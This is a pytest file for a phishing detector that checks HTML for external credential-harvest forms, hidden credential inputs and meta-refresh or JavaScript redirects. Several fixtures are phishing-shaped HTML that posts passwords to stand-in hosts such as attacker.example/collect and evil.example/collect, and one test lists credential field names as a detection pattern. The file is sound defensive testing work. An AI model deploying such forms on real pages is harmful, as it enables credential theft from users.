"""HTML phishing-shape heuristics — credential forms, hidden fields, redirects.

The heuristics work on raw HTML so they fire whether justhtml or
BeautifulSoup is installed; tests exercise the regex helpers directly
and end-to-end through the analyzer.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from structure import Structure, Severity
from Utils.password_broker import PasswordBroker


@pytest.fixture(autouse=True)
def _clear():
    Structure.clear_cache()
    PasswordBroker.clear()
    yield
    Structure.clear_cache()
    PasswordBroker.clear()


def _analyze(html: bytes) -> Structure:
    return Structure.create(
        data=html,
        filename="body.html",
        mime_type="text/html",
    )


# ---------------------------------------------------------------
# Credential-harvest form: <form action=external> with <input password>
# ---------------------------------------------------------------


def test_password_form_to_external_url_is_high():
    html = (
        b"<html><body>"
        b'<form action="https://attacker.example/collect" method="POST">'
        b'<input type="text" name="email">'
        b'<input type="password" name="passwd">'
        b'<button type="submit">Sign in</button>'
        b'</form></body></html>'
    )
    s = _analyze(html)
    rep = s.analyzer.reports.get("phishing_credential_form")
    assert rep is not None, list(s.analyzer.reports)
    assert rep.severity == Severity.HIGH
    assert "attacker.example" in rep.text
    assert rep.data["actions"] == ["https://attacker.example/collect"]


def test_password_form_to_relative_action_does_not_fire():
    """A form posting to a relative URL is the legitimate same-site
    case (e.g. SaaS login page rendered as part of an OAuth flow)."""
    html = (
        b"<html><body>"
        b'<form action="/login" method="POST">'
        b'<input type="password" name="p"></form>'
        b"</body></html>"
    )
    s = _analyze(html)
    assert "phishing_credential_form" not in s.analyzer.reports


def test_external_form_without_password_does_not_fire():
    """An external form without a password field is e.g. a search box;
    not the credential-harvest shape."""
    html = (
        b"<html><body>"
        b'<form action="https://search.example/q">'
        b'<input type="text" name="q">'
        b"</form></body></html>"
    )
    s = _analyze(html)
    assert "phishing_credential_form" not in s.analyzer.reports


# ---------------------------------------------------------------
# Hidden credential-style input
# ---------------------------------------------------------------


@pytest.mark.parametrize(
    "name",
    ["username", "email", "login", "account", "pin", "password",
     "passwd", "pwd", "token", "csrf"],
)
def test_hidden_credential_field_detected(name):
    html = (
        b"<html><body><form>"
        b'<input type="hidden" name="' + name.encode() + b'" value="x">'
        b"</form></body></html>"
    )
    s = _analyze(html)
    rep = s.analyzer.reports.get("phishing_hidden_cred_fields")
    assert rep is not None, name
    assert rep.severity == Severity.MEDIUM


def test_normal_hidden_field_does_not_fire():
    """``<input type="hidden" name="theme">`` is a routine form-state
    field — must not be flagged."""
    html = (
        b"<html><body><form>"
        b'<input type="hidden" name="theme" value="dark">'
        b'<input type="hidden" name="lang" value="en">'
        b"</form></body></html>"
    )
    s = _analyze(html)
    assert "phishing_hidden_cred_fields" not in s.analyzer.reports


# ---------------------------------------------------------------
# Meta-refresh redirect
# ---------------------------------------------------------------


def test_meta_refresh_to_external_url_detected():
    html = (
        b"<html><head>"
        b'<meta http-equiv="refresh" '
        b'content="0;url=https://attacker.example/landing">'
        b"</head><body>Loading...</body></html>"
    )
    s = _analyze(html)
    rep = s.analyzer.reports.get("phishing_redirect")
    assert rep is not None
    assert "attacker.example" in rep.text
    assert any(r["kind"] == "meta-refresh" for r in rep.data["redirects"])


def test_meta_refresh_to_relative_url_does_not_fire():
    """Relative refresh is benign (e.g. "redirect after save" idiom)."""
    html = (
        b"<html><head>"
        b'<meta http-equiv="refresh" content="2;url=/done.html">'
        b"</head></html>"
    )
    s = _analyze(html)
    assert "phishing_redirect" not in s.analyzer.reports


# ---------------------------------------------------------------
# JS-driven redirect via window.location
# ---------------------------------------------------------------


def test_js_window_location_to_external_url_detected():
    html = (
        b"<html><head><script>"
        b'window.location = "https://attacker.example/collect";'
        b"</script></head></html>"
    )
    s = _analyze(html)
    rep = s.analyzer.reports.get("phishing_redirect")
    assert rep is not None
    assert any(r["kind"] == "js-location" for r in rep.data["redirects"])


def test_js_location_replace_detected():
    html = (
        b"<html><head><script>"
        b'location.replace("https://attacker.example/x");'
        b"</script></head></html>"
    )
    s = _analyze(html)
    rep = s.analyzer.reports.get("phishing_redirect")
    assert rep is not None


def test_js_location_to_relative_url_does_not_fire():
    html = (
        b"<html><head><script>"
        b'window.location = "/dashboard";'
        b"</script></head></html>"
    )
    s = _analyze(html)
    assert "phishing_redirect" not in s.analyzer.reports


# ---------------------------------------------------------------
# Combined shape — should fire all three indicators
# ---------------------------------------------------------------


def test_combined_phishing_page_fires_all_indicators():
    html = (
        b"<html><head>"
        b'<meta http-equiv="refresh" content="5;url=https://evil.example/x">'
        b"</head><body>"
        b'<form action="https://evil.example/collect" method="POST">'
        b'<input type="hidden" name="username" value="x">'
        b'<input type="password" name="p">'
        b"</form></body></html>"
    )
    s = _analyze(html)
    assert "phishing_credential_form" in s.analyzer.reports
    assert "phishing_hidden_cred_fields" in s.analyzer.reports
    assert "phishing_redirect" in s.analyzer.reports


# ---------------------------------------------------------------
# Clean HTML — no false positives
# ---------------------------------------------------------------


def test_legitimate_email_html_no_phishing_findings():
    """A typical newsletter/invoice email body must not light up any
    of the three phishing indicators."""
    html = (
        b"<html><body>"
        b"<p>Hello, your invoice is attached.</p>"
        b'<a href="https://example.com/portal">Customer portal</a>'
        b"</body></html>"
    )
    s = _analyze(html)
    assert "phishing_credential_form" not in s.analyzer.reports
    assert "phishing_hidden_cred_fields" not in s.analyzer.reports
    assert "phishing_redirect" not in s.analyzer.reports
